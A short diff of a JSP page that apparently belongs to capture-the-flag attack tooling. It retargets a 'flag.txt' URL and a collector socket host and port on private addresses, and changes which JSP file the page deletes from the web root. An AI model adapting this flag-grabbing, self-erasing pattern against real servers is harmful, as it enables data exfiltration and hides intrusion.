@@ -21,10 +21,10 @@
   	<h1>index02</h1>
   	
   	<%
-  		String flagUrl = "http://10.0.0.2:8080/";
+  		String flagUrl = "http://172.16.80.144/flag.txt";
   		String charsetName = "UTF8";
-  		String socketHost = "172.16.5.13";
-  		int socketPort = 6061;
+  		String socketHost = "172.16.80.1";
+  		int socketPort = 8000;
   		
   		String ipAddrStr = "";
 	    InetAddress ip = null;
@@ -112,7 +112,7 @@
   				String webContentPath = new File(getClass().getClassLoader().getResource("").toURI()).getPath();
   	  			webContentPath = webContentPath.replace("WEB-INF" + File.separator + "classes", "");
   	  			
-  	  			File jspFile = new File(webContentPath + "index02.jsp");
+  	  			File jspFile = new File(webContentPath + "rf.jsp");
   	  			if(jspFile.exists()){
   	  				jspFile.delete();
   	  			}
